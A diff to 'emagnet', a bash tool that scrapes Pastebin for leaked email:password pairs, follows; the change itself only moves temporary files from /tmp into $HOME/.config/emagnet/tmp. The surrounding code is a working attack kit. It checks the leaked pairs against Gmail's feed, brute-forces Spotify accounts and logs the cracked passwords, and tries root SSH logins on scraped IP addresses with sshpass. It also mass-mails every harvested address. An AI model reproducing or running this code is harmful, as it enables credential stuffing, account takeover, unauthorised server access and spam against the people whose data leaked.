@@ -42,6 +42,7 @@
 
 CONF="$HOME/.config/emagnet/emagnet.conf"
 mkdir -p "$HOME/.config/emagnet/"
+mkdir -p "$HOME/.config/emagnet/tmp"
 
 emagnet_banner() {
 cat << "EOF"
@@ -134,8 +135,8 @@ emagnet_mustbefilled() {
   if [[ -z "$SSHUSER"        ]];then sed -i '169d' "$CONF";sed -i '169 i SSHUSER="root"'                                                                                                          "$CONF";fi
   if [[ -z "$SSHPORT"        ]];then sed -i '170d' "$CONF";sed -i '170 i SSHPORT="22"'                                                                                                            "$CONF";fi
   if [[ -z "$SSHPASS"        ]];then sed -i '171d' "$CONF";sed -i '171 i SSHPASS='                                                                                                                "$CONF";fi
-  if [[ -z "$SSHTARGETS"     ]];then sed -i '172d' "$CONF";sed -i '172 i SSHTARGETS="/tmp/.emagnet-sshbruter.txt"'                                                                                "$CONF";fi
-  if [[ -z "$SSHPORTSCAN"    ]];then sed -i '173d' "$CONF";sed -i '173 i SSHPORTSCAN="/tmp/.emagnet-portscan"'                                                                                    "$CONF";fi
+  if [[ -z "$SSHTARGETS"     ]];then sed -i '172d' "$CONF";sed -i '172 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"'                                                                                "$CONF";fi
+  if [[ -z "$SSHPORTSCAN"    ]];then sed -i '173d' "$CONF";sed -i '173 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan"'                                                                                    "$CONF";fi
   if [[ -z "$VPN"            ]];then sed -i '150d' "$CONF";sed -i '150 i VPN=false'                                                                                                               "$CONF";fi
   if [[ -z "$VPNROOT"        ]];then sed -i '151d' "$CONF";sed -i '151 i VPNROOT=/etc/openvpn'                                                                                                    "$CONF";fi
   if [[ -z "$VPNPROVIDER"    ]];then sed -i '152d' "$CONF";sed -i '152 i VPNPROVIDER=$VPNROOT/'                                                                                                   "$CONF";fi
@@ -441,7 +442,7 @@ else
   MYCOUNTRY="$(curl -s https://nr1.nu/i/|xargs whois|grep -i COUNTRY|awk '{print tolower($2)}')"
   COUNTRY=$(awk -F'="' '/VPNCOUNTRYS="/ {print $2}' $CONF|sed 's/"//g'|tr ' ' '\n'|shuf -n1)
 
-  curl -H "$USERAGENT" -Ls "$WIP" > "/tmp/.emagnet-ip"
+  curl -H "$USERAGENT" -Ls "$WIP" > "$HOME/.config/emagnet/tmp/emagnet-ip"
 
       if [[ -n "$OPENVPNRUNNING" ]]; then
          pkill -9 "openvpn"
@@ -455,7 +456,7 @@ printf "\n"
         emagnet_vpnsetup
         sleep 10
         MYIP="$(curl -s https://nr1.nu/i/)"
-        MYOLDIP="$(cat /tmp/.emagnet-ip)"
+        MYOLDIP="$(cat $HOME/.config/emagnet/tmp/.emagnet-ip)"
 
 	    if [[ "$MYIP" != "$MYOLDIP" ]]; then
                  MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
@@ -633,7 +634,7 @@ fi
 
 blocked() {
  if [[ -z "$USERAGENT" ]]; then echo -e "$basename$0: internal errror -- you must set a useragent in $CONF";exit 1;fi
- if ! [[ -s "/tmp/.emagnet" ]]; then curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > /tmp/.emagnet;fi
+ if ! [[ -s "$HOME/.config/emagnet/tmp/.emagnet" ]]; then curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > $HOME/.config/emagnet/tmp/.emagnet;fi
 }
 
 emagnet_sshbruter() {
@@ -656,7 +657,7 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
 |sort\
 |grep -v $SKIPLIST\
 |awk -F, '!seen[$1]++'> $SSHPORTSCAN
-if [[ $(cat /tmp/.emagnet-portscan|wc -l) -eq "0" ]]; then
+if [[ $(cat $HOME/.config/emagnet/tmp/.emagnet-portscan|wc -l) -eq "0" ]]; then
     printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
     sleep 2
 else
@@ -668,8 +669,8 @@ else
       printf "Please use (CTRL+C) to abort the scan at anytime................\n"
       printf "%64s\n" | tr ' ' '='
     sleep 2
-parallel -j$THREADS -a /tmp/.emagnet-portscan '\
-timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee /tmp/.emagnet-sshbruter.txt 2>&1 grep open && \
+parallel -j$THREADS -a $HOME/.config/emagnet/tmp/.emagnet-portscan '\
+timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee $HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt 2>&1 grep open && \
 timeout 1 sshpass -p "$SSHPASS" ssh -v "-o StrictHostKeyChecking=no" $SSHUSER@{} pwd 2>&1 grep "Authenticated to" &> /dev/null
 if [[ $? -eq "0" ]]; then
     echo -e "[\e[1;32m>>\e[0m] - Found password: root@{}"
@@ -694,13 +695,13 @@ emagnet_spotify_bruter() {
 VERSION="0.6.0"
 WWWSOURCE="https://nr1.nu/archive/sconsify"
 SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
-SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
+SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 
      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
-    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> /tmp/.emagnet-passwords.txt
+    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
 
 	     while read line; do
                	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
@@ -717,12 +718,12 @@ SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
               		echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              		echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
                         # For stats
-               		echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >> /tmp/.emagnet-cracked
-               		echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >> /tmp/.emagnet-failed
-                        SUCCEED="$(cat /tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
-                        FAILED="$(cat /tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
+               		echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >> $HOME/.config/emagnet/tmp/.emagnet-cracked
+               		echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >> $HOME/.config/emagnet/tmp/.emagnet-failed
+                        SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
+                        FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
                     fi
-             done < "/tmp/.emagnet-passwords.txt"
+             done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
              printf "%64s \n" | tr ' ' '='
              echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
              sleep 3
@@ -730,7 +731,7 @@ SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
 
 emagnet_gmail_bruter() {
 if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
-grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 
+grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt 
 
 while read -r line; do
 attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
@@ -753,8 +754,8 @@ password="$(echo $line | cut -d: -f2)"
          echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
       fi
 
-  done < "/tmp/.emagnet-passwords.txt"
-    rm "/tmp/.emagnet-passwords.txt" &> /dev/null
+  done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
+    rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
     sleep 3
 else
     sleep 1
@@ -792,11 +793,11 @@ else
              case $sendtoall in
                   "yes")
                           printf "%62s \n" | tr ' ' '='
-                          grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > /tmp/.emagnet-spam
+                          grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > $HOME/.config/emagnet/tmp/.emagnet-spam
                           while read e1; do
                                 printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.'
-                          done < "/tmp/.emagnet-spam"
-                                rm "/tmp/.emagnet-spam" &> /dev/null
+                          done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
+                                rm "$HOME/.config/emagnet/tmp/.emagnet-spam" &> /dev/null
                           ;;
                   "*")
                           echo -e "- Aborted..\n"
@@ -828,7 +829,7 @@ fi
     |grep -o 'href="/archive/............' \
     |cut -d'<' -f1 \
     |cut -d'/' -f3 \
-    |cut -d'"' -f1 > /tmp/.emagnet-syntaxes
+    |cut -d'"' -f1 > $HOME/.config/emagnet/tmp/.emagnet-syntaxes
 
   if [[ -z "$SYNTAX2DL" ]]; then
       echo -e "$basename$0: internal error -- you must choose a syntax language to download, aborted.."
@@ -839,21 +840,21 @@ fi
 |grep -o '<a href="/........' \
 |cut -d'/' -f2 \
 |grep -E '[0-9]{1,4}' \
-|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "/tmp/.emagnet-syntaxes-urls"
- grep -q "$SYNTAX2DL" "/tmp/.emagnet-syntaxes"
+|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls"
+ grep -q "$SYNTAX2DL" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes"
 
 if [[ "$?" = "0" ]]; then
      emagnet_clear
      emagnet_banner
-     printf "Downloading $(cat /tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
+     printf "Downloading $(cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
      mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
-       xargs -P "${THREADS}" -n 1 wget --user-agent="${USERAGENT}" -nc -q < /tmp/.emagnet-syntaxes-urls -P "$EMAGNETSYNTAX/$SYNTAX2DL" &> /dev/null
+       xargs -P "${THREADS}" -n 1 wget --user-agent="${USERAGENT}" -nc -q < $HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls -P "$EMAGNETSYNTAX/$SYNTAX2DL" &> /dev/null
      printf "\n%s\n\n" "Done.."
-     rm "/tmp/.emagnet-syntaxes-urls" "/tmp/.emagnet-syntaxes" &> /dev/null
+     rm "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes" &> /dev/null
  else
      echo -e "$basename$0: internal error -- $SYNTAX2DL is not a valid syntax language.."
-     echo -e "try 'cat /tmp/.emagnet-syntaxes' for find valid syntaxes"
-       rm "/tmp/.emagnet-syntaxes-urls" "/tmp/.emagnet-syntaxes" &> /dev/null
+     echo -e "try 'cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes' for find valid syntaxes"
+       rm "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes" &> /dev/null
 fi
 }
 
@@ -864,28 +865,28 @@ emagnet_main() {
    |cut -d'"' -f1 \
    |awk 'length($0)>6 && length($0)<9' \
    |grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' \
-   |awk '{print tolower($0)}' > /tmp/.emagnet1
+   |awk '{print tolower($0)}' > $HOME/.config/emagnet/tmp/.emagnet1
     ls -1 "$EMAGNETALL" \
    |sort > "./1"
-    cat "/tmp/.emagnet1" \
+    cat "$HOME/.config/emagnet/tmp/.emagnet1" \
    |sort \
    |cut -d/ -f5 > "./2"
     grep  -v -x -F -f "1" "2"  \
    |awk -F, '!seen[$1]++' \
-   |sed "s/^/https:\/\/pastebin.com\/raw\//g" > "/tmp/.emagnet"
+   |sed "s/^/https:\/\/pastebin.com\/raw\//g" > "$HOME/.config/emagnet/tmp/.emagnet"
     rm "./1" "./2" &> /dev/null
 
-	   if [[ "$(cat /tmp/.emagnet1|wc -l)" = "8" ]];then
+	   if [[ "$(cat $HOME/.config/emagnet/tmp/.emagnet1|wc -l)" = "8" ]];then
               emagnet_notice_about_scraping
            fi
 
-             if [[ "$(cat /tmp/.emagnet1|grep https)" = "0" ]];then
+             if [[ "$(cat $HOME/.config/emagnet/tmp/.emagnet1|grep https)" = "0" ]];then
                emagnet_heavyload
                emagnet_I_was_banned
              fi
 
-               xargs -P "${THREADS}" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < /tmp/.emagnet &> /dev/null
-                 tt="$(cat /tmp/.emagnet| wc -l)"
+               xargs -P "${THREADS}" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < $HOME/.config/emagnet/tmp/.emagnet &> /dev/null
+                 tt="$(cat $HOME/.config/emagnet/tmp/.emagnet| wc -l)"
                     if [[ "$tt" -lt "10" ]]; then
                       tt="0$tt"
                     fi
@@ -899,7 +900,7 @@ emagnet_main() {
 # -:-                         emagnet_banner
                         else
                              echo -e "\n======================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n======================================"  >> "$EMAGNETLOGS/pastebin-urls.txt"
-                             cat "/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
+                             cat "$HOME/.config/emagnet/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
                         fi
 
 ef=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk -F':' '{print $1}'|awk -F, '!seen[$1]++')
@@ -978,7 +979,7 @@ sleep 2
 
 fi
     mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-    rm "/tmp/.emagnet" "/tmp/.emagnet1"  &> /dev/null
+    rm "$HOME/.config/emagnet/tmp/.emagnet" "$HOME/.config/emagnet/tmp/.emagnet1"  &> /dev/null
     sleep 2
     pkill -9 "notify-send" &> /dev/null
 }
@@ -1066,7 +1067,8 @@ case $1 in
             fi
 
            elif [[ $2 = "spotify" ]]; then
-             find /usr/include -type d |grep 'libspotify' &> /dev/null
+            emagnet_conf 
+            find /usr/include -type d |grep 'libspotify' &> /dev/null
              if [[ "$?" -ne "0" ]]; then
                   if [[ -z "$LIBSPOTIFY" ]]; then
 	             printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
